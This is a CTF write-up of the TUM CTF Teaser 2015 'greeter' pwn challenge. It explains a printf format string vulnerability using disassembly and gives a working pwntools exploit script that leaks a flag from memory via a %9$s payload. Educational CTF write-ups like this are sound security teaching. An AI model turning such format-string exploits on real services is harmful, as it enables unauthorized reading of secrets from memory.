# TUM CTF Teaser 2015: greeter

**Category:** Pwn
**Points:** 15
**Solves:** 36
**Description:**

> Baby's 1st
> 
> [greeter](greeter)
> 
> nc 1.ctf.link 1030


## Write-up

by [f0rki](https://github.com/f0rki)

This was the first challenge in the pwn category and was pretty easy to solve.
The service asks us for our name and then tells us to pwn harder.

```
Hi, what's your name?
adsfasdf
Pwn harder, asdfasdf!
```

After a quick look at the disassembly with [radare2](http://radare.org/r/)
wee can see that there are two consecutive
calls to `printf` to print the `Pwn harder, $name!` string. 

```
0x004006d1    bf9f084000     mov edi, str._e_34mPwn_harder_ ; str._e_34mPwn_harder_ ; greeter.c:29  
0x004006d6    31c0           xor eax, eax
0x004006d8    e8c3feffff     call sym.imp.printf
0x004006dd    4889df         mov rdi, rbx                  ; greeter.c:30  
0x004006e0    31c0           xor eax, eax
0x004006e2    e8b9feffff     call sym.imp.printf
0x004006e7    bfb1084000     mov edi, str.__e_0m           ; "!.[0m" @ 0x4008b1 ; greeter.c:31  
0x004006ec    e87ffeffff     call sym.imp.puts
```

And the format string argument seems to be something non-constant. This smells
like a format string vulnerability.
```
Hi, what's your name?
%x 
Pwn harder, 60be2f50!
```

Yes! So we have a pretty straight forward format string vulnerability. At the start
of the `main` function we have code that reads the flag.txt file and stores it
at a location which is apparently not randomized by ASLR.
```
0x00400619    bf96084000     mov edi, str.flag.txt         ; "flag.txt" @ 0x400896
0x0040061e    e8bdffffff     call sym.imp.fopen
0x00400623    4885c0         test rax, rax
0x00400626    0f84d8000000   je 0x400704                  
0x0040062c    4889c2         mov rdx, rax                  ; greeter.c:18  
0x0040062f    be00010000     mov esi, 0x100
0x00400634    bfa00c6000     mov edi, obj.flag             ; obj.flag
0x00400639    4889c5         mov rbp, rax
0x0040063c    e87fffffff     call sym.imp.fgets
```

So we now have to craft a format string that prints the flag. So we add the 
address of the flag object to our format string and use the `%N$s` format 
specifier to directly access the N'th argument, to get to the address of flag. 
After playing around with  the format string a little bit, I got the flag 
`hxp{f0rm4t_sTr1ngs_r0ck}`.
Here is the script I used.

```python
from pwn import *  # NOQA

context.log_level = 'debug'

p = remote("1.ctf.link", 1030)
#p = process("./greeter")
velf = ELF("./greeter")
flagaddr = velf.symbols["flag"]
log.info("Flag addr = 0x{:x}".format(flagaddr))

#fmtstr = ""
fmtstr = "AAAA" * 2
fmtstr += r"%9$s"
fmtstr += "BBBB"
#fmtstr += r"%9$x"
fmtstr += p64(flagaddr)
fmtstr += p64(flagaddr)
fmtstr += p64(flagaddr)

p.recvline()
p.sendline(fmtstr)
line = p.recv()
log.info(line)
m = re.search("(hxp{.*})", line)
if m:
    log.info("found flag: " + m.groups()[0])
p.clean_and_log()
```

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/tum-ctf-teaser-2015/pwn/greeter/sudhackar/README.md>
